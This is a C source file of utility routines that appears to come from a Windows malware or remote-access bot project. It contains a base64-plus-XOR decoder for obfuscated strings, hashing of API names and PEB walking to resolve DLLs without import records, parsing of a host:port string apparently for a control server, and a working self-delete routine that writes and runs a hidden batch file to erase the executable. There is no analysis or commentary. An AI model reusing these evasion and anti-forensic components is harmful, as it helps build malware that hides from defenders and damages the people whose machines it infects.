#include "Server.h"
#include "ApiBlock.h"
#include "Utils.h"
#define NTSECAPI

static char base64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

_declspec(naked) char __fastcall upcaseA(char c)
{
	__asm
	{
		mov al, cl
			cmp al, 'a'
			jl m1
			cmp al, 'z'
			jg m1
			and al, 0xdf
m1:
		retn
	}
}

int __fastcall strcmpiA(const char *s1, const char *s2)
{
	unsigned long k = 0;
	unsigned char c1, c2;
	do
	{
		c1 = upcaseA(s1[k]);
		c2 = upcaseA(s2[k]);
		if (c1 > c2)
		{
			return 1;
		}
		else if (c1 < c2)
		{
			return -1;
		};

		k++;
	} while ((c1 | c2) != 0);
	return 0;
}
static int pos(char c)
{
	char *p;
	for(p = base64; *p; p++)
		if(*p == c)
			return p - base64;
	return -1;
}

int base64_decode(const char *str, char **data)
{
	const char *s, *p;
	unsigned char *q;
	int c;
	int x;
	int done = 0;
	int len;
	s = (const char *)malloc(__STRLEN__((LPSTR)str));
	q = (unsigned char *)s;
	for(p=str; *p && !done; p+=4){
		x = pos(p[0]);
		if(x >= 0)
			c = x;
		else{
			done = 3;
			break;
		}
		c*=64;

		x = pos(p[1]);
		if(x >= 0)
			c += x;
		else
			return -1;
		c*=64;

		if(p[2] == '=')
			done++;
		else{
			x = pos(p[2]);
			if(x >= 0)
				c += x;
			else
				return -1;
		}
		c*=64;

		if(p[3] == '=')
			done++;
		else{
			if(done)
				return -1;
			x = pos(p[3]);
			if(x >= 0)
				c += x;
			else
				return -1;
		}
		if(done < 3)
			*q++=(c&0x00ff0000)>>16;

		if(done < 2)
			*q++=(c&0x0000ff00)>>8;
		if(done < 1)
			*q++=(c&0x000000ff)>>0;
	}

	len = q - (unsigned char*)(s);

	*data = (char*)realloc((void *)s, len);

	return len;
}

char* MyDecode(char *str)
{
	int		i, len;
	char	*data = NULL;
	len = base64_decode(str, &data);

	for (i = 0; i < len; i++)
	{
		data[i] -= 0x26;
		data[i] ^= 0x29;
	}
	return data;
}
char *My_Strcpy(char *dst,const char *src)
{
	char *ret = dst;
	while((*dst++ = *src++) != '\0');
	return ret;
}
void CleanZero(PCHAR pCleanBuffer,ULONG ulLength)
{
	ULONG ulCnt;

	ulCnt = 0;

	while (ulCnt < ulLength)
	{
		if (*(pCleanBuffer + ulCnt) != 0)
		{
			*(pCleanBuffer + ulCnt) = 0;
		}
		ulCnt++;
	}
}
PCHAR My__MEMCPY__(PCHAR pDst,PCHAR pSrc,ULONG ulLength)
{
	ULONG ulCnt;

	ulCnt = 0;
	while (ulCnt < ulLength)
	{
		*pDst++ = *pSrc++;
		ulCnt++;
	}
	return pDst;
}
ULONG CalcHashValue(char *szApiName)
{
	USHORT ulHashValue;
	ULONG ulTmp,ulOrValue;
	int i;
	CHAR szTmp;

	ulHashValue = 1;
	ulOrValue = 0;

	for (i = 0;i < my_strlen(szApiName);i++)
	{
		szTmp = szApiName[i];
		ulHashValue += szTmp;
		ulOrValue += ulHashValue;
	}
	ulTmp = ulOrValue << 0x10;
	ulTmp |= ulHashValue;
	return ulTmp;
}
int My_memicmp(char *src,char *dest,int size)
{
	char *src_tmp = src;
	char *dest_tmp = dest;
	while(size--)
	{
		if((*src_tmp==*dest_tmp)||
			(((*src_tmp)-'A'+'a')==*dest_tmp)
			||*src_tmp==((*dest_tmp)-'A'+'a'))
		{
			src_tmp++;
			dest_tmp++;
			continue;
		}
		return -1;
	}
	return 0;
}
char *My_stristr(char *src,char *dest)
{
	int x_len;
	int i;
	int ret;
	char *src_tmp = src;
	char *dest_tmp = dest;
	x_len=my_strlen(dest_tmp);
	i=my_strlen(src_tmp);

	if(i<x_len)	return 0;

	i-=(x_len-1);
	while(i--)
	{
		ret=My_memicmp(src_tmp++,dest_tmp,x_len);
		if(!ret) return --src_tmp;
	}
	return 0;
}
int my_strlen(char *str)
{
	int i;
	char* str_tmp = str;
	i=0;
	while(*str_tmp++)i++;
	return i;
}
int my_strcmp(char *src,char *dest)
{
	char *src_tmp = src;
	char *dest_tmp = dest;
	while(*src_tmp == *dest_tmp)
	{
		if(*src_tmp)
		{
			src_tmp++;
			dest_tmp++;
			continue;
		}
		return 0;
	}
	return -1;
}
BOOL __ISUPPER__(__in CHAR c) {
	return ('A' <= c) && (c <= 'Z'); 
};

CHAR __TOLOWER__(__in CHAR c) {
	return __ISUPPER__(c) ? c - 'A' + 'a' : c; 
};

ULONG __STRLEN__(PCHAR pStr)
{
	ULONG uli = 0;
	while (pStr[uli] != '\0')
    {
		uli++;
    }
	return uli;
}

ULONG __STRLENW__(__in LPWSTR lpStr1)
{
	ULONG i = 0;
	while (lpStr1[i] != L'\0')
		i++;

	return i;
}

LPSTR __STRSTRI__(__in LPSTR lpStr1, __in LPSTR lpStr2)
{
	ULONG ulLen;
	CHAR c = __TOLOWER__((lpStr2++)[0]);
	if (!c)
		return lpStr1;

	ulLen = __STRLEN__(lpStr2);
	do
	{
		CHAR sc;
		do
		{
			sc = __TOLOWER__((lpStr1++)[0]);
			if (!sc)
				return NULL;
		} while (sc != c);
	} while (__STRNCMPI__(lpStr1, lpStr2, ulLen) != 0);

	return (lpStr1 - 1); // FIXME: -0?
}

LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2)
{
	ULONG ulLen;
	CHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]);
	if (!c)
		return lpStr1;

	ulLen = __STRLENW__(lpStr2);
	do
	{
		CHAR sc;
		do
		{
			sc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]);
			if (!sc)
				return NULL;
		} while (sc != c);
	} while (__STRNCMPIW__(lpStr1, lpStr2, ulLen) != 0);

	return (lpStr1 - 1); // FIXME -2 ?
}

ULONG __STRCMPI__(
	__in LPSTR lpStr1,
	__in LPSTR lpStr2)
{
	int  v;
	CHAR c1, c2;
	do
	{
		c1 = *lpStr1++;
		c2 = *lpStr2++;
		// The casts are necessary when pStr1 is shorter & char is signed 
		v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);
	} while ((v == 0) && (c1 != '\0') && (c2 != '\0'));
	return v;
}

ULONG __STRNCMPI__(
	__in LPSTR lpStr1,
	__in LPSTR lpStr2,
	__in DWORD dwLen)
{
	int  v;
	CHAR c1, c2;
	do
	{
		dwLen--;
		c1 = *lpStr1++;
		c2 = *lpStr2++;
		/* The casts are necessary when pStr1 is shorter & char is signed */
		v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);
	} while ((v == 0) && (c1 != '\0') && (c2 != '\0') && dwLen > 0);
	return v;
}

ULONG __STRNCMPIW__(
	__in LPWSTR lpStr1,
	__in LPWSTR lpStr2,
	__in DWORD dwLen)
{
	int  v;
	CHAR c1, c2;
	do {
		dwLen--;
		c1 = ((PCHAR)lpStr1++)[0];
		c2 = ((PCHAR)lpStr2++)[0];
		/* The casts are necessary when pStr1 is shorter & char is signed */
		v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);
	} while ((v == 0) && (c1 != 0x0) && (c2 != 0x0) && dwLen > 0);

	return v;
}

LPSTR __STRCAT__(
	__in LPSTR	strDest,
	__in LPSTR strSource)
{
	LPSTR d = strDest;
	LPSTR s = strSource;

	while (*d) d++;

	do { *d++ = *s++; } while (*s);
	*d = 0x0;

	return strDest;
}


LPWSTR __STRCATW__(
	__in LPWSTR	strDest,
	__in LPWSTR strSource)
{
	LPWSTR d = strDest;
	LPWSTR s = strSource;

	while (*d != L'\0') d++;
	do { *d++ = *s++; } while (*s != L'\0');
	*d = L'\0';

	return strDest;
}

LPVOID __MEMCPY__(
	__in LPVOID lpDst,
	__in LPVOID lpSrc,
	__in DWORD dwCount)
{
	LPBYTE s = (LPBYTE)lpSrc;
	LPBYTE d = (LPBYTE)lpDst;

	while (dwCount--)
		*d++ = *s++;

	return lpDst;
}
#pragma optimize( "", off ) 
VOID __MEMSET__(__in LPVOID p, __in CHAR cValue, __in DWORD dwSize)
{
	ULONG uli;
	for (uli = 0; uli < dwSize; uli++)
		((PCHAR)p)[uli] = cValue;
}
#pragma optimize( "", off ) 
ULONG UnicodeToAnsi(PWCHAR pSrc,PCHAR pDst,ULONG ulSize)
{
	ULONG ulNeedSize;

	ulNeedSize = 0;
	if (ulSize)
	{
		ulNeedSize = g_Kernel32ApiBlock.MyWideCharToMultiByte(CP_ACP, \
			0, \
			pSrc, \
			-1, \
			pDst, \
			ulSize, \
			0, \
			FALSE);
	}
	else
	{
		ulNeedSize = g_Kernel32ApiBlock.MyWideCharToMultiByte(CP_ACP, \
			0, \
			pSrc, \
			-1, \
			0, \
			0, \
			0, \
			FALSE);
	}
	return ulNeedSize;
}
ULONG AnsiToUnicode(PCHAR pSrc,PWCHAR pDst,ULONG ulSize)
{
	ULONG ulNeedSize;

	ulNeedSize = 0;
	if (ulSize)
	{
		ulNeedSize = g_Kernel32ApiBlock.MyMultiByteToWideChar(CP_ACP, \
			0, \
			pSrc, \
			-1, \
			pDst, \
			ulSize);
	}
	else
	{
		ulNeedSize = g_Kernel32ApiBlock.MyMultiByteToWideChar(CP_ACP, \
			0, \
			pSrc, \
			-1, \
			0, \
			0);
	}
	return ulNeedSize;
}

HANDLE GetLdrDllHandle(PWCHAR pDllName)
{
	HANDLE hDllBase = INVALID_HANDLE_VALUE;
#ifdef _WIN64
	PPEB lpPeb = (PPEB)__readgsqword(0x60);
#else
	PPEB lpPeb = (PPEB)__readfsdword(0x30);
#endif
	PLIST_ENTRY pListHead = &lpPeb->Ldr->InMemoryOrderModuleList;
	PLIST_ENTRY pListEntry = pListHead->Flink;
	WCHAR strDllName[MAX_PATH];

	while (pListEntry != pListHead)
	{
		PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (pModEntry->FullDllName.Length)
		{
			DWORD dwLen = pModEntry->FullDllName.Length;
			__MEMCPY__(strDllName, pModEntry->FullDllName.Buffer, dwLen);
			strDllName[dwLen / sizeof(WCHAR)] = L'\0';
			if (__STRSTRIW__(strDllName, pDllName))
			{
				hDllBase = pModEntry->DllBase;
				break;
			}
		}
		pListEntry = pListEntry->Flink;
	}
	return hDllBase;
}
int StormRand(int count)
{
	unsigned long Time = g_Kernel32ApiBlock.MyGetTickCount();
	int seed = rand() + 3;
	seed = (seed * Time) % count;
	return seed;
}
void SplitLoginInfo(char *lpDecodeString,char **lppszHost,LPDWORD lppPort)
{
	BOOLEAN bIsProxyUsed;
	BOOLEAN	bIsAuth;
	UINT nSize;
	char *lpString;
	char *pStart,*pNext/**pEnd*/;

	*lppszHost = NULL;
	*lppPort = 0;
	bIsAuth = FALSE;
	bIsProxyUsed = FALSE;
	nSize = __STRLEN__(lpDecodeString) + 1;
	lpString = (char*)malloc(nSize);
	__MEMCPY__(lpString,lpDecodeString,nSize);

	*lppszHost = lpString;

	if ((pStart = strchr(lpString,':')) == NULL)
		return;

	*pStart = '\0';
	if ((pNext = strchr(pStart + 1,'|')) != NULL)
	{
		bIsProxyUsed = TRUE;
		*pNext = '\0';
	}
	*lppPort = atoi(pStart + 1);
}
BOOLEAN getLoginInfo(char *lpURL, char **lppszHost, LPDWORD lppPort)
{
	if (lpURL == NULL)
		return FALSE;
	SplitLoginInfo(lpURL, lppszHost, lppPort);
	return TRUE;
}
//HANDLE GetPidFromProcessName(PWCHAR wProcName)
//{
//	HANDLE hSnapshot;
//	PROCESSENTRY32W pe32;
//
//	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
//	if (hSnapshot == INVALID_HANDLE_VALUE)
//	{
//		return NULL;
//	}
//	pe32.dwSize = sizeof(PROCESSENTRY32W);
//	if (!Process32FirstW(hSnapshot,&pe32))
//	{
//		CloseHandle(hSnapshot);
//		return NULL;
//	}
//	do 
//	{
//		if (_wcsnicmp(pe32.szExeFile,wProcName,wcslen(wProcName)) == 0)
//		{
//			CloseHandle(hSnapshot);
//			return (HANDLE)pe32.th32ProcessID;
//		}
//	} while (Process32NextW(hSnapshot,&pe32));
//	CloseHandle(hSnapshot);
//	return NULL;
//}
// Get System Information
DWORD CPUClockMhz()
{
	HKEY hKey;
	DWORD dwCPUMhz;
	DWORD dwBytes;
	DWORD dwType ;

	dwBytes = sizeof(DWORD);
	dwType = REG_DWORD;
	g_AdvApi32ApiBlock.MyRegOpenKeyW(HKEY_LOCAL_MACHINE,L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",&hKey);
	g_AdvApi32ApiBlock.MyRegQueryValueExW(hKey,L"~MHz",NULL,&dwType,(PBYTE)&dwCPUMhz,&dwBytes);
	g_AdvApi32ApiBlock.MyRegCloseKey(hKey);
	return dwCPUMhz;
}
//BOOLEAN SelfDeleteMe()
//{
//	SHELLEXECUTEINFOA ShellExecuteInfoA;
//	CHAR Module[MAX_PATH];
//	CHAR Comspec[MAX_PATH];
//	CHAR Params[MAX_PATH];
//
//	CleanZero(Module,MAX_PATH);
//	CleanZero(Comspec,MAX_PATH);
//	CleanZero(Params,MAX_PATH);
//
//
//	if (g_Kernel32ApiBlock.MyGetModuleFileNameA(NULL,Module,MAX_PATH) != 0 && \
//		g_Kernel32ApiBlock.MyGetShortPathNameA(Module,Module,MAX_PATH) != 0 && \
//		g_Kernel32ApiBlock.MyGetEnvironmentVariableA("COMSPEC",Comspec,MAX_PATH) != 0)
//	{
//		strcpy(Params,"/c del ");
//		__STRCAT__(Params,Module);
//		__STRCAT__(Params," > nul");
//		ShellExecuteInfoA.cbSize = sizeof(SHELLEXECUTEINFOA);
//		ShellExecuteInfoA.hwnd = NULL;
//		ShellExecuteInfoA.lpVerb = "Open";
//		ShellExecuteInfoA.lpFile = Comspec;
//		ShellExecuteInfoA.lpParameters = Params;
//		ShellExecuteInfoA.lpDirectory = 0;
//		ShellExecuteInfoA.nShow = SW_HIDE;
//		ShellExecuteInfoA.fMask = SEE_MASK_NOCLOSEPROCESS;
//		if (g_Shell32ApiBlock.MyShellExecuteExA(&ShellExecuteInfoA))
//		{
//			g_Kernel32ApiBlock.MySetPriorityClass(ShellExecuteInfoA.hProcess,IDLE_PRIORITY_CLASS);
//			g_Kernel32ApiBlock.MySetPriorityClass(g_Kernel32ApiBlock.MyGetCurrentProcess(),REALTIME_PRIORITY_CLASS);
//			g_Kernel32ApiBlock.MySetThreadPriority(g_Kernel32ApiBlock.MyGetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);
//			g_Shell32ApiBlock.MySHChangeNotify(SHCNE_DELETE,SHCNF_PATH,Module,0);
//			return TRUE;
//		}
//	}
//	return FALSE;
//}
BOOLEAN SelfDeleteMe()
{
	CHAR Module[MAX_PATH];
	CHAR DeleteBat[MAX_PATH];
	CHAR CmdLine[MAX_PATH];
	CHAR CmdLine2[50];
	HANDLE hFile;
	ULONG ulRetBytes;

	CleanZero(Module,MAX_PATH);
	CleanZero(DeleteBat,MAX_PATH);
	CleanZero(CmdLine,MAX_PATH);
	CleanZero(CmdLine2,50);

	g_Kernel32ApiBlock.MyGetModuleFileNameA(NULL,Module,MAX_PATH);
	g_Kernel32ApiBlock.MyGetTempPathA(MAX_PATH,DeleteBat);
	//g_Kernel32ApiBlock.MyGetCurrentDirectoryA(MAX_PATH,DeleteBat);

	__STRCAT__(DeleteBat,"\\TmpDelMe.Bat");

	//StringCchPrintfA(CmdLine,MAX_PATH,"del %s\ndel %%0\n",Module);
	sprintf_s(CmdLine,MAX_PATH,"del %s\r\n",Module);

	hFile = g_Kernel32ApiBlock.MyCreateFileA(DeleteBat, \
		FILE_WRITE_ACCESS, \
		0, \
		NULL, \
		CREATE_ALWAYS, \
		FILE_ATTRIBUTE_NORMAL, \
		NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return FALSE;
	}
	if (g_Kernel32ApiBlock.MyWriteFile(hFile,CmdLine,__STRLEN__(CmdLine),&ulRetBytes,NULL) == FALSE)
	{
		g_Kernel32ApiBlock.MyCloseHandle(hFile);
		return FALSE;
	}
	__MEMCPY__(CmdLine2,"del %0",__STRLEN__("del %0"));
	if (g_Kernel32ApiBlock.MyWriteFile(hFile,CmdLine2,__STRLEN__(CmdLine2),&ulRetBytes,NULL) == FALSE)
	{
		g_Kernel32ApiBlock.MyCloseHandle(hFile);
		return FALSE;
	}
	g_Kernel32ApiBlock.MyCloseHandle(hFile);
	g_Kernel32ApiBlock.MyWinExec(DeleteBat,SW_HIDE);
	return TRUE;
}
PCHAR MyStrChr(PCHAR pDest,ULONG ulAscii)
{
    ULONG uli,ulLength;
    if (NULL == pDest || ulAscii == 0)
    {
        return NULL;
    }
    ulLength = __STRLEN__(pDest);
    for (uli = 0;uli < ulLength;uli++)
    {
        if (pDest[uli] == ulAscii)
        {
            return (PCHAR)(pDest + uli);
        }
    }
    return NULL;
}